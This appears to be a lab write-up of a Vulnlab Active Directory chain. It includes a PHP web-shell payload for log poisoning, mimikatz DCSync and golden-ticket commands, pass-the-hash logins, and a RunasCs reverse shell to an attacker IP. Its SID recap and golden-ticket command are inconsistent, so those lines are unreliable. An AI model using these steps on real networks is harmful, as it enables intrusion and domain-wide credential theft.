@@ -1,0 +1,458 @@
+---
+title : "[AD] Vulnlab chain: Trusted"
+date: 2025-02-01 00:00:00 +0800
+tags: [ad,vulnlab, practice]
+categories: [ad,vulnlab, practice]
+---
+# Enumeration
+
+## trusteddc.trusted.vl
+### Port Scan
+
+```
+# Nmap 7.94SVN scan initiated Mon Jan 20 11:18:01 2025 as: /usr/lib/nmap/nmap -sC -sV -vv -p- -oN ports -T4 10.10.150.181
+Nmap scan report for 10.10.150.181
+Host is up, received echo-reply ttl 127 (0.037s latency).
+Scanned at 2025-01-20 11:18:02 CET for 116s
+Not shown: 65511 closed tcp ports (reset)
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-20 10:19:00Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+|_ssl-date: 2025-01-20T10:19:57+00:00; -1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: TRUSTED
+|   NetBIOS_Domain_Name: TRUSTED
+|   NetBIOS_Computer_Name: TRUSTEDDC
+|   DNS_Domain_Name: trusted.vl
+|   DNS_Computer_Name: trusteddc.trusted.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-01-20T10:19:48+00:00
+| ssl-cert: Subject: commonName=trusteddc.trusted.vl
+| Issuer: commonName=trusteddc.trusted.vl
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-01-19T10:16:49
+| Not valid after:  2025-07-21T10:16:49
+| MD5:   974f:590a:4ad8:5168:a5b8:11a3:b3d7:4f79
+| SHA-1: 6476:35ee:d1ed:b072:63e4:dfc2:07eb:71c2:63cb:770b
+| -----BEGIN CERTIFICATE-----
+| MIIC7DCCAdSgAwIBAgIQFjpd167um5xBDinVESG3HzANBgkqhkiG9w0BAQsFADAf
+| MR0wGwYDVQQDExR0cnVzdGVkZGMudHJ1c3RlZC52bDAeFw0yNTAxMTkxMDE2NDla
+| Fw0yNTA3MjExMDE2NDlaMB8xHTAbBgNVBAMTFHRydXN0ZWRkYy50cnVzdGVkLnZs
+| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0ISReJu65rtQRzQE5ryv
+| IRkDOk+QBsIGLLSMHvSxG1ceaSVjUM+ZrfmakNLU6j0AsOhNu55IOQlCIG+jvh+1
+| PZ3EkBhFxh/Ji97e8XEgKIK0ARX5XE2HepORr7jdl06TxxrxqNvhbMF016bPEx58
+| 5fEXw54xZSWe6YVk62yAPymMdlLp1VsnMqUeYedzaTgkDS/iOiUzDoyS0GkZ/C68
+| 924rAhfs0bLJXsrOWj8eBHdc42s0/sRLVInhNX1/zORJkfM5TxxyCVj8A0skcimV
+| ieD2V9h+WMsgZiERjWR2ecIhZTVzrz0iNybvB64KzrqmCJfjhlFhEsc3cnr3h380
+| hQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJ
+| KoZIhvcNAQELBQADggEBAKxPy+mPmIrVkZevervF3axR4Tk2zPYvAaWqOLy7lwLp
+| Q2n+iR3emU1MqcHY2P+oKMVKRZ78yohDMRiYzQ98gpqPnHqiGnxTkD8q5h/uMNvj
+| IQPhGtJGa7ytadJp6ZTFgY6vX48cRu+IdzSxRDRl2XN8smmoBzoyCigUQH0AWdWy
+| aLo+FbpyW+ADJi9vdMeTyniXZI2a2Wme03djRGkkQ0iFMVeaSkzluzEmQgzmN/m/
+| psUtZ+gIlhDHDyirAIA7EwJ9RozaoJcDOpy52+ofS+ihc5Gi9DnqHqqA2U1NYxal
+| G9kmN0BAbgSnYKxLhEzSqFRsGeoj4zQkrZAWjDFkJvU=
+|_-----END CERTIFICATE-----
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+51831/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+54301/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 30302/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 39863/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 46592/udp): CLEAN (Timeout)
+|   Check 4 (port 18850/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2025-01-20T10:19:50
+|_  start_date: N/A
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jan 20 11:19:58 2025 -- 1 IP address (1 host up) scanned in 117.30 seconds
+
+```
+
+
+## labdc.lab.trusted.vl
+### Port Scan
+
+```
+# Nmap 7.94SVN scan initiated Mon Jan 20 11:18:28 2025 as: /usr/lib/nmap/nmap -sC -sV -vv -p- -oN ports -T4 10.10.150.182
+Nmap scan report for 10.10.150.182
+Host is up, received echo-reply ttl 127 (0.035s latency).
+Scanned at 2025-01-20 11:18:29 CET for 117s
+Not shown: 65507 closed tcp ports (reset)
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
+|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-title: Welcome to XAMPP
+|_Requested resource was http://10.10.150.182/dashboard/
+|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-20 10:19:27Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
+443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
+|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
+|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+| -----BEGIN CERTIFICATE-----
+| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
+| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
+| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
+| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
+| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
+| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
+| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
+| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
+| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
+|_-----END CERTIFICATE-----
+| http-title: Welcome to XAMPP
+|_Requested resource was https://10.10.150.182/dashboard/
+|_ssl-date: TLS randomness does not represent time
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+3306/tcp  open  mysql         syn-ack ttl 127 MySQL 5.5.5-10.4.24-MariaDB
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.4.24-MariaDB
+|   Thread ID: 10
+|   Capabilities flags: 63486
+|   Some Capabilities: LongColumnFlag, Speaks41ProtocolOld, IgnoreSigpipes, FoundRows, Support41Auth, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsTransactions, InteractiveClient, ODBCClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: J]v\H3f*:%H}];NVD2nS
+|_  Auth Plugin Name: mysql_native_password
+3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+| ssl-cert: Subject: commonName=labdc.lab.trusted.vl
+| Issuer: commonName=labdc.lab.trusted.vl
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-01-19T10:16:53
+| Not valid after:  2025-07-21T10:16:53
+| MD5:   c389:fc65:64dc:c5b1:1090:8333:830c:1ada
+| SHA-1: a531:02a3:d54c:050e:73c8:4622:97af:8df1:fc80:8e40
+| -----BEGIN CERTIFICATE-----
+| MIIC7DCCAdSgAwIBAgIQbRGqgHwO7Z5Jbbm+MHlH2zANBgkqhkiG9w0BAQsFADAf
+| MR0wGwYDVQQDExRsYWJkYy5sYWIudHJ1c3RlZC52bDAeFw0yNTAxMTkxMDE2NTNa
+| Fw0yNTA3MjExMDE2NTNaMB8xHTAbBgNVBAMTFGxhYmRjLmxhYi50cnVzdGVkLnZs
+| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsykNGbPEY3vb/qz/xCYU
+| 9YShkmKMYX5xPDXuVcC9nKG2V+T7Tr+ts+QRe4LupNr7Ir+CvaTQzvFh0EptwssF
+| IgU0AI9rnHCldAMWhLOERQOcqLOhnOm1aWiYvsmdE4fgrEjUsXOkntr778/ZEyy0
+| nVtsDSHdgz9Lr1Bk0sESdXorOyhjWCKkdaVHslFSDHmTsL2GP4vACH3n9URtSKp5
+| LtqKq1hdaGeSuj2E/nt4pUqF/E6YMV9Y7dpgmKAefCDb3PPZPXINPB+TyZ+abUkm
+| lRJh5wJ7NyJcyLz/drhuh6lHPCYGzch7hfTAUCtZbroCHeaLn03TpzaDMTcy+uR6
+| mQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJ
+| KoZIhvcNAQELBQADggEBABGps+Y53g+K82oiKCROIL3UMw+TqYN84kh0PjoX85Y9
+| j2SRIZF145Wwn7E0xVoSQu3w0QyQfVkS6R39N9kmgLBUlNR4/KJ8wrBziUXc+vho
+| W8SIZTTwZyIeI7AK6xYaabTAAW+O5Pr/no4tSHZzXGQwTpsf41CKyzBclxIHfV1y
+| 2CltbR1ZTgfg9J3FndO48DzTu6jnjJrmM/e8qfiU0hc2xORwpjyXIhh7+uhlbh94
+| DH5n3S6CEV6L2IDWLNuG3mzRqkl3oOuIl+OUYOYRLi4OmdfFDHc9ARcWlF8EM5jj
+| PaBS1979yoHmNuED6HuX6i7OJB+vr2pu9O0Y/CWGOzQ=
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info: 
+|   Target_Name: LAB
+|   NetBIOS_Domain_Name: LAB
+|   NetBIOS_Computer_Name: LABDC
+|   DNS_Domain_Name: lab.trusted.vl
+|   DNS_Computer_Name: labdc.lab.trusted.vl
+|   DNS_Tree_Name: trusted.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-01-20T10:20:16+00:00
+|_ssl-date: 2025-01-20T10:20:23+00:00; -2s from scanner time.
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+59188/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+63228/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 5960/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 22996/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 45629/udp): CLEAN (Timeout)
+|   Check 4 (port 13925/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-01-20T10:20:16
+|_  start_date: N/A
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jan 20 11:20:26 2025 -- 1 IP address (1 host up) scanned in 117.80 seconds
+
+```
+
+### Port 80 - HTTP
+![alt text](/assets/Trusted/Trusted-Feroxbuster.png)
+
+The directory `/dev` looks promising.
+
+By browsing the website we can notice that each page is included in the url as following, this may be vulnerable to LFI/RFI:
+
+```
+http://10.10.166.134/dev/index.html?view=about.html
+```
+
+Querying for a non existent page like
+
+```
+http://10.10.166.134/dev/index.html?view=idonotexist.html
+```
+
+
+Reveals that the website is including the page using the php **include** function.
+
+
+![alt text](/assets/Trusted/Trusted-HomePage.png)
+
+Let's see if we can include a remote php file and therefore obtaining RCE
+
+![alt text](/assets/Trusted/Trusted-LFI.png)
+
+No quick win but nice try anyway.
+
+
+
+
+# Exploitation
+
+## labdc.lab.trusted.vl
+
+We know that 
+
+```text
+http://labdc.lab.trusted.vl/dev/index.html?view=idonotexist.html
+```
+
+Is vulnerable to LFI from the enumeration made earlier but RFI is not possible.
+
+### Apache log poisoning
+
+After some fuzzing the location of apache access logs can be discovered:
+
+```text
+http://10.10.166.134/dev/index.html?view=C:/xampp/apache/logs/access.log
+```
+
+![alt text](/assets/Trusted/Trusted-LFI2.png)
+
+Obtaining RCE trough log poisoning seems feasible.
+
+We can intercept and repeat the request using burp
+
+![alt text](/assets/Trusted/Trusted-Poisoning.png)
+
+Changing the user agent to:
+
+```http
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+
+After sending the request, we restore the User Agent and check if the php code is executed:
+
+![alt text](/assets/Trusted/Trusted-RCE.png)
+
+As we can see, the output of the command whoami is:
+
+```text
+nt authority\system
+```
+
+This means that we have RCE and we are also admin on the machine running the server. To obtain a full reverse shell we can just use a base64 encoded powershell reverse shell
+![alt text](/assets/Trusted/Trusted-RevShell.png)
+
+![alt text](/assets/Trusted/Trusted-Whoami.png)
+
+We have our first flag!
+
+![alt text](/assets/Trusted/Trusted-Flag1.png)
+
+Here we can notice that this machine is **domain joined**:
+
+![alt text](/assets/Trusted/Trusted-Domain.png)
+
+
+## Enumerating the domain using Bloodhound
+
+
+Using Bloodhound we can notice how we have bidirectional parent-domain trust between trusted.vl and lab.trusted.vl
+
+![alt text](/assets/Trusted/Trusted-Bloodhound.png)
+
+## Exploiting the trust
+
+To exploit a parent-child bidirectional trust we have to first gather some information:
+* The KRBTGT hash for the child domain
+- The SID for the child domain
+- The name of a target user in the child domain (does not need to exist!)
+- The FQDN of the child domain.
+- The SID of the Enterprise Admins group of the root domain.
+
+### KRBTGT Hash
+
+To retrieve the hash of the krbtgt user mimikatz can be used.
+
+```powershell
+.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:LAB\krbtgt" "exit"
+```
+
+![alt text](/assets/Trusted/Trusted-krbtgtNTLM.png)
+
+
+The corresponding NTLM hash is:
+
+```text
+c7a03c565c68c6fac5f8913fab576ebd
+```
+
+### Child domain SID
+
+Using **PowerView.ps1**
+
+```text
+Get-DomainSID
+```
+
+![alt text](/assets/Trusted/Trusted-childDomainSID.png)
+
+The result is:
+
+```text
+S-1-5-21-2241985869-2159962460-1278545866
+```
+
+
+### Enterprise Admin Group SID
+
+Again, by using **PowerView**:
+
+```powershell
+Get-DomainGroup -Domain trusted.vl -Identity "Enterprise Admins" | select distinguishedname,objectsid
+```
+
+![alt text](/assets/Trusted/Trusted-EnterpriseAdminSID.png)
+
+The resulting SID is:
+
+```text
+S-1-5-21-3576695518-347000760-3731839591-519
+```
+
+### Golden ticket
+
+Recap of the information that we need to have before forging a **golden ticket** exploiting the parent-child domain trust:
+
+* The KRBTGT hash for the child domain: **c7a03c565c68c6fac5f8913fab576ebd**
+- The SID for the child domain: **S-1-5-21-2241985869-2159962460-1278545866**
+- The name of a target user in the child domain: **Administrator**
+- The FQDN of the child domain: **lab.trusted.vl**
+- The SID of the Enterprise Admins group of the root domain: **S-1-5-21-2241985869-2159962460-1278545866**
+
+Since we have everything we need to forge the golden ticket, mimikatz can be used:
+
+```
+.\mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:lab.trusted.vl /sid:S-1-5-21-3576695518-347000760-3731839591-519 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt" "exit"
+```
+
+![alt text](/assets/Trusted/Trusted-GoldenTicket.png)
+
+Having this golden ticket allow us to perform a **DCSync** attacks on the parent domain:
+
+```
+.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:TRUSTEDDC\Administrator /domain:trusted.vl" "exit"
+```
+
+![alt text](/assets/Trusted/Trusted-DCSync.png)
+
+The NTLM hash of the Administrator user is:
+
+```text
+15db914be1e6a896e7692f608a9d72ef
+```
+
+We can now open an interactive shell on the DC as Administrator using WINRM:
+
+```text
+evil-winrm -i trusteddc.trusted.vl -u 'Administrator' -H '15db914be1e6a896e7692f608a9d72ef'
+```
+
+This will give us the last flag! (Or not?)
+
+![alt text](/assets/Trusted/Trusted-DCAsAdmin.png)
+
+
+Trying to read the content of the file root.txt we will receive an error, the fix is easy:
+
+* Change the Administrator password: `net user Administrator l33tl33t@`
+* Generate a reverse shell using RunasCS.exe `.\RunasCs.exe Administrator 'l33tl33t@' cmd.exe -r 10.8.5.10:9002`
+Now we can correctly read the flag
